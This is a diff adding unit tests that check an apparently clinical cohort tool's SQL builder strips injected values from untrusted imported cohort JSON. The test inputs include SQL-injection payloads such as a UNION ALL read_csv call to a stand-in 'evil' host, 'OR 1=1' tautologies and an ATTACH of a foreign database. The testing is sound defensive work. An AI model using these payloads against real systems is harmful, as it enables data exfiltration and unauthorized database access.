@@ -293,3 +293,132 @@ describe('buildCohortCountSql free-text criterion', () => {
     expect(sql).not.toContain('EXISTS')
   })
 })
+
+// A cohort's criteria are not developer-authored: importProjectZip JSON.parses
+// cohorts/*.json straight into storage with no schema validation, so every
+// field below can arrive from a shared ZIP or a cloned repo carrying whatever
+// the author put there. The forms coerce and constrain; import does not.
+describe('criteria from an untrusted cohort JSON', () => {
+  const eventMapping = {
+    ...mapping,
+    eventTables: {
+      Measurement: {
+        table: 'measurement',
+        conceptIdColumn: 'measurement_concept_id',
+        patientIdColumn: 'person_id',
+        valueColumn: 'value_as_number',
+        dateColumn: 'measurement_date',
+      },
+    },
+  } as unknown as SchemaMapping
+
+  function conceptCohort(config: unknown): Cohort {
+    const c = makeCohort('patient')
+    c.criteriaTree.children = [
+      { kind: 'criterion', id: 'x', type: 'concept', enabled: true, operator: 'AND', exclude: false, config },
+    ] as never
+    return c
+  }
+
+  function durationCohort(config: unknown): Cohort {
+    const c = makeCohort('visit')
+    c.criteriaTree.children = [
+      { kind: 'criterion', id: 'x', type: 'duration', enabled: true, operator: 'AND', exclude: false, config },
+    ] as never
+    return c
+  }
+
+  it('drops an occurrence count that is not a number', () => {
+    // Unguarded this closed the HAVING and appended a UNION ALL ... read_csv(),
+    // i.e. an outbound-egress channel out of a "cohort definition".
+    const sql = buildCohortCountSql(
+      conceptCohort({
+        eventTableLabel: 'Measurement',
+        conceptIds: [1],
+        occurrenceCount: { operator: '>=', count: "1 UNION ALL SELECT 1 FROM read_csv('http://evil/x')" },
+      }),
+      eventMapping,
+    )!
+    expect(sql).not.toContain('read_csv')
+    expect(sql).not.toContain('UNION ALL')
+  })
+
+  it('drops an occurrence operator outside the declared union', () => {
+    const sql = buildCohortCountSql(
+      conceptCohort({
+        eventTableLabel: 'Measurement',
+        conceptIds: [1],
+        occurrenceCount: { operator: '>= 0 OR 1=1 --', count: 2 },
+      }),
+      eventMapping,
+    )!
+    expect(sql).not.toContain('OR 1=1')
+  })
+
+  it('drops a value filter whose bound is not a number', () => {
+    const sql = buildCohortCountSql(
+      conceptCohort({
+        eventTableLabel: 'Measurement',
+        conceptIds: [1],
+        valueFilters: [{ operator: '>', value: '0 OR 1=1' }],
+      }),
+      eventMapping,
+    )!
+    expect(sql).not.toContain('OR 1=1')
+  })
+
+  it('drops a value filter whose operator is not a comparison', () => {
+    const sql = buildCohortCountSql(
+      conceptCohort({
+        eventTableLabel: 'Measurement',
+        conceptIds: [1],
+        valueFilters: [{ operator: 'IS NOT NULL OR 1=1 --', value: 0 }],
+      }),
+      eventMapping,
+    )!
+    expect(sql).not.toContain('OR 1=1')
+  })
+
+  it('drops a legacy single value filter that is not numeric', () => {
+    const sql = buildCohortCountSql(
+      conceptCohort({
+        eventTableLabel: 'Measurement',
+        conceptIds: [1],
+        valueFilter: { operator: '>', value: '1; ATTACH \'evil.db\' AS e' },
+      }),
+      eventMapping,
+    )!
+    expect(sql).not.toContain('ATTACH')
+  })
+
+  it('drops non-numeric duration bounds', () => {
+    const sql = buildCohortCountSql(
+      durationCohort({ durationLevel: 'visit', durationUnit: 'days', minDays: '0 OR 1=1' }),
+      eventMapping,
+    )!
+    expect(sql).not.toContain('OR 1=1')
+  })
+
+  it('still emits the filters when the values are legitimate', () => {
+    const sql = buildCohortCountSql(
+      conceptCohort({
+        eventTableLabel: 'Measurement',
+        conceptIds: [1],
+        valueFilters: [{ operator: '>=', value: 3 }, { operator: 'between', value: 1, value2: 9 }],
+        occurrenceCount: { operator: '>=', count: 2 },
+      }),
+      eventMapping,
+    )!
+    expect(sql).toContain('"value_as_number" >= 3')
+    expect(sql).toContain('BETWEEN 1 AND 9')
+    expect(sql).toContain('HAVING COUNT(*) >= 2')
+  })
+
+  it('keeps a valid duration range, parenthesized so an OR group cannot split it', () => {
+    const sql = buildCohortCountSql(
+      durationCohort({ durationLevel: 'visit', durationUnit: 'days', minDays: 2, maxDays: 10 }),
+      eventMapping,
+    )!
+    expect(sql).toMatch(/\(DATE_DIFF\('day'.*>= 2 AND DATE_DIFF\('day'.*<= 10\)/s)
+  })
+})
